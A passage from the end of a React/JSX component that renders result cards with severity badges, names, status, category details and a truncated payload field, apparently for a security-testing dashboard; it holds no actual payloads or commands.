                      <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase border flex-shrink-0 ${SEV[r.severity]??SEV["medium"]}`}>{r.severity}</span>
                      <span className="text-white font-bold truncate">{r.name}</span>
                      <span className={`text-[8px] px-1.5 border ml-auto flex-shrink-0 ${r.status==="success"?"text-green-400 border-green-900":"text-zinc-500 border-zinc-700"}`}>{r.status.toUpperCase()}</span>
                    </div>
                    <div className="text-zinc-500 mt-0.5">[{r.category}] {r.detail}</div>
                    {r.payload && <div className="mt-1.5 text-[9px] text-cyan-500 font-mono truncate border border-cyan-900/30 bg-cyan-950/10 px-2 py-1">{r.payload.slice(0,150)}</div>}
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
